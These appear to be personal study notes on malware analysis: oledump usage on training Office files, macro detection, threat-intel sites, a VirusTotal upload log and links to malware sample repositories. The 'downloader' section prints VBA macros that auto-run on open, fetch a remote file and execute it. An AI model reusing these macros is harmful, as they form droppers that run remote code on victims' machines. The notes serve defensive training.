# Malware Analysis

- [Tools](#tools)
	- [Oledump](#oledump)
		- [Dump streams](#dump-streams)
		- [Analyze stream](#analyze-stream)
		- [Print metadata](#print-metadata)
		- [Plugin biff](#plugin-biff)
		- [DOCX](#docx)
		- [macro](#macro)
		- [errors](#errors)
		- [Downloader](#downloader)
		- [Plugin HTTP heuristics](#plugin-http-heuristics)
- [Online resources](#online-resources)
- [General infos](#general-infos)
- [Truestory Analysis](#truestory-analysis)
- [Virustotal](#virustotal)
- [Malware samples](#malware-samples)
- [Javascript deobfuscation](#javascript-deobfuscation)

## tools

regshot https://sourceforge.net/projects/regshot/

Sysinternals: Process Monitor and Process Explorer

Fake DNS: https://www.fireeye.com/services/freeware/apatedns.html

Sandbox: https://cuckoosandbox.org/

Browserling: https://www.browserling.com/

Wannabrowser: https://www.wannabrowser.net/

Floss: https://github.com/mandiant/flare-floss (to extract strings)

CAPA: https://github.com/mandiant/capa

## oledump

reference:

https://www.youtube.com/watch?v=kk1KUEVtDgQ&list=PLa-ohdLO29_bPkYHC3bBUM5jh1vwrmzqX

```
$ hexdump -C -v ex001.doc  |head
00000000  d0 cf 11 e0 a1 b1 1a e1  00 00 00 00 00 00 00 00  |................|
00000010  00 00 00 00 00 00 00 00  3e 00 03 00 fe ff 09 00  |........>.......|
00000020  06 00 00 00 00 00 00 00  00 00 00 00 01 00 00 00  |................|
00000030  26 00 00 00 00 00 00 00  00 10 00 00 28 00 00 00  |&...........(...|
```

`D0 CF 11 E0` magic bytes for *Compound File Binary Format*

### dump streams

To dump every "streams" inside the file:

```
$ python2 ./oledump.py exercises/ex001.doc
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      6360 '1Table'
  5:      4096 'WordDocument'
```

### analyze stream

To analyze first stream:

```
$ python2 ./oledump.py -s 1 exercises/ex001.doc
00000000: 01 00 FE FF 03 0A 00 00 FF FF FF FF 06 09 02 00  ..▒▒....▒▒▒▒....
00000010: 00 00 00 00 C0 00 00 00 00 00 00 46 20 00 00 00  ....▒......F ...
00000020: 4D 69 63 72 6F 73 6F 66 74 20 57 6F 72 64 20 39  Microsoft Word 9
00000030: 37 2D 32 30 30 33 20 44 6F 63 75 6D 65 6E 74 00  7-2003 Document.
00000040: 0A 00 00 00 4D 53 57 6F 72 64 44 6F 63 00 10 00  ....MSWordDoc...
..
..
```

`-x` to just show HEX

`-d` to dump bytes in raw format

### print metadata

To print metadata:

```
$ python2 ./oledump.py -M exercises/ex002.xls
Properties SummaryInformation:
 codepage: 1252 ANSI Latin 1; Western European (Windows)
 author: root
 last_saved_by: root
 create_time: 2015-09-06 09:36:33
 last_saved_time: 2015-09-06 09:36:58
 creating_application: Microsoft Excel
 security: 0
..
..
```

### plugin biff

```
$ python2 ./oledump.py -p plugin_biff exercises/ex002.xls
  1:      4096 '\x05DocumentSummaryInformation'
  2:      4096 '\x05SummaryInformation'
  3:     13235 'Workbook'
               Plugin: BIFF plugin
                 0809     16 BOF : Beginning of File
                 00e1      2 INTERFACEHDR : Beginning of User Interface Records
                 00c1      2 MMS :  ADDMENU / DELMENU Record Group Count
                 00e2      0 INTERFACEEND : End of User Interface Records
..
..
```

### docx

```
$ hexdump -C exercises/ex005.docx |head
00000000  50 4b 03 04 14 00 06 00  08 00 00 00 21 00 09 24  |PK..........!..$|
00000010  87 82 81 01 00 00 8e 05  00 00 13 00 08 02 5b 43  |..............[C|
00000020  6f 6e 74 65 6e 74 5f 54  79 70 65 73 5d 2e 78 6d  |ontent_Types].xm|
00000030  6c 20 a2 04 02 28 a0 00  02 00 00 00 00 00 00 00  |l ...(..........|
00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
```

`PK` stands for ZIP file.

```
$ unzip -t exercises/ex005.docx
Archive:  exercises/ex005.docx
    testing: [Content_Types].xml      OK
    testing: _rels/.rels              OK
    testing: word/_rels/document.xml.rels   OK
    testing: word/document.xml        OK
    testing: word/theme/theme1.xml    OK
    testing: word/settings.xml        OK
    testing: word/webSettings.xml     OK
    testing: word/stylesWithEffects.xml   OK
    testing: docProps/core.xml        OK
    testing: word/styles.xml          OK
    testing: word/fontTable.xml       OK
    testing: docProps/app.xml         OK
No errors detected in compressed data of exercises/ex005.docx.
```

ASCII dump of stream n.4

```
$ python2 ./zipdump.py -s4 -a exercises/ex005.docx  |head
00000000: 3C 3F 78 6D 6C 20 76 65 72 73 69 6F 6E 3D 22 31  <?xml version="1
00000010: 2E 30 22 20 65 6E 63 6F 64 69 6E 67 3D 22 55 54  .0" encoding="UT
00000020: 46 2D 38 22 20 73 74 61 6E 64 61 6C 6F 6E 65 3D  F-8" standalone=
00000030: 22 79 65 73 22 3F 3E 0D 0A 3C 77 3A 64 6F 63 75  "yes"?>..<w:docu
00000040: 6D 65 6E 74 20 78 6D 6C 6E 73 3A 77 70 63 3D 22  ment xmlns:wpc="
00000050: 68 74 74 70 3A 2F 2F 73 63 68 65 6D 61 73 2E 6D  http://schemas.m
00000060: 69 63 72 6F 73 6F 66 74 2E 63 6F 6D 2F 6F 66 66  icrosoft.com/off
..
..
```

### macro

```
$ python2 ./oledump.py exercises/ex006.doc.zip
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      6368 '1Table'
  5:       413 'Macros/PROJECT'
  6:        65 'Macros/PROJECTwm'
  7: m     675 'Macros/VBA/Module1'
  8: m     924 'Macros/VBA/ThisDocument'
  9:      2437 'Macros/VBA/_VBA_PROJECT'
 10:       559 'Macros/VBA/dir'
 11:      4096 'WordDocument'
```

"m" means: contains vba code *attribute* (not actual code)

To see the attributes:

```
$ python2 ./oledump.py -s8 -v exercises/ex006.doc.zip
Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
```

```
$ python2 ./oledump.py exercises/ex007.doc.zip
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      6489 '1Table'
  5:       414 'Macros/PROJECT'
  6:        65 'Macros/PROJECTwm'
  7: M    1000 'Macros/VBA/Module1'
  8: m     932 'Macros/VBA/ThisDocument'
```

"M" means: real vba code!

```
$ python2 ./oledump.py -s 7 -v exercises/ex007.doc.zip
Attribute VB_Name = "Module1"
Sub demo()
    MsgBox "Hello world"
End Sub
```

pay attention to this routine

```
Sub *AutoOpen()*
	MsgBox "Hello World!"
End Sub
```

AutoOpen = automatically executed when open document


## errors

N.B. "E" means Error

```bash
$ python2 ./oledump.py exercises/ex012.doc.zip
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      6505 '1Table'
  5:       416 'Macros/PROJECT'
  6:        65 'Macros/PROJECTwm'
  7: E    1012 'Macros/VBA/Module1'
  8: m     932 'Macros/VBA/ThisDocument'
..
..
```

```bash
$ python2 ./oledump.py -s 7 -v exercises/ex012.doc.zip
Error: unable to decompress
```

you can try `--vbadecompresscorrupt`

```
$ python2 ./oledump.py -s 7 -v --vbadecompresscorrupt exercises/ex012.doc.zip
```

## downloader

```bash
$ python2 ./oledump.py -s 7 -v --vbadecompresscorrupt exercises/ex013.doc.zip
Attribute VB_Name = "Module1"
Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpszOp As String, ByVal lpszFile As String, ByVal lpszParams As String, ByVal LpszDir As String, ByVal FsShowCmd As Long) As Long

Sub AutoOpen_()
    Dim strURL As String
    Dim strPath As String

    strURL = "http://didierstevens.com/index.html"

    strPath = Environ("temp") + "\index.txt"

    URLDownloadToFile 0, strURL, strPath, 0, 0

    ShellExecute 0, "open", strPath, "", "", 1
End Sub
```

APIs: `URLDownloadToFile`, `ShellExecute`


Another downloader (with `ActiveX`)

```
Attribute VB_Name = "Module1"
Sub AutoOpen_()
    Dim strURL As String
    Dim strPath As String
    Dim oXMLHTTP As Object
    Dim iFileNumber As Integer
    Dim abPayload() As Byte
    Dim oShell As Object

    strURL = "http://didierstevens.com/index.html"

    strPath = Environ("temp") + "\index.txt"

    Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    oXMLHTTP.Open "GET", strURL, False
    oXMLHTTP.Send
..
..
```


## plugin http heuristics

try to extract urls from VBA

```
$ python2 ./oledump.py -p plugin_http_heuristics exercises/ex014.doc.zip
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      6517 '1Table'
  5:       419 'Macros/PROJECT'
  6:        65 'Macros/PROJECTwm'
  7: M    2765 'Macros/VBA/Module1'
               Plugin: HTTP Heuristics plugin
                 http://didierstevens.com/index.html
  8: m     924 'Macros/VBA/ThisDocument'
               Plugin: HTTP Heuristics plugin
                 'N\x18\xac\x0e\x87.\x99\xe9\xed'
```


## online resources

https://any.run/

https://www.hybrid-analysis.com/

https://abuse.ch/ and his sub-domains:

https://bazaar.abuse.ch/

you can upload a sample or research (eg. `md5:367b6a5c0e0e8ec68ea14a085b1d32b3`)

https://threatfox.abuse.ch

eg. search for `ioc:212.192.246.30:5555`

https://sslbl.abuse.ch/

https://urlhaus.abuse.ch

https://urlscan.io/

https://sitecheck.sucuri.net/

https://www.urlvoid.com

https://feodotracker.abuse.ch

https://feodotracker.abuse.ch/browse.php?search=178.134.47.166

API often used in malware: https://malapi.io/

## General infos

https://any.run/malware-trends/


## Truestory analysis

https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/

## Virustotal

```
joshua@kaligra:~$ msf-virustotal -k 94410b2bd266b6e3d2e859aa278efea7b3684181XXXXXXXXXXXXXXXXXXXXXX -f Documents/malware-traffic-analysis/knr.exe
[*] Using API key: 94410b2bd266b6e3d2e859aa278efea7b3684181XXXXXXXXXXXXXXXXXXXXXXXX
[*] Please wait while I upload Documents/malware-traffic-analysis/knr.exe...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : cc28e40b46237ab6d5282199ef78c464
[*] Sample SHA1 hash   : 0d5c820002cf93384016bd4a2628dcc5101211f4
[*] Sample SHA256 hash : 749e161661290e8a2d190b1a66469744127bc25bf46e5d0c6f2e835f4b92db18
[*] Analysis link: https://www.virustotal.com/gui/file/749e161661290e8a2d190b1a66469744127bc25bf46e5d0c6f2e835f4b92db18/detection/f-749e161661290e8a2d190b1a66469744127bc25bf46e5d0c6f2e835f4b92db18-1662214988
[*] Requesting the report...
[*] Analysis Report: knr.exe (47 / 71): 749e161661290e8a2d190b1a66469744127bc25bf46e5d0c6f2e835f4b92db18
====================================================================================================

 Antivirus             Detected  Version               Result                                              Update
 ---------             --------  -------               ------                                              ------
 ALYac                 true      1.1.3.1               Backdoor.RAT.Netwire                                20220824
 APEX                  true      6.326                 Malicious                                           20220822
 AVG                   true      21.1.5827.0           Win32:Malware-gen                                   20220824
 Acronis               false     1.2.0.108                                                                 20220426
 Ad-Aware              true      3.0.21.193            Trojan.GenericKD.32089895                           20220824
..
..
..
..
```


## Malware samples

https://github.com/ytisf/theZoo

https://github.com/vxunderground/MalwareSourceCode

https://zeltser.com/malware-sample-sources/

# javascript-deobfuscation

https://www.youtube.com/watch?v=imiuHXlq37g
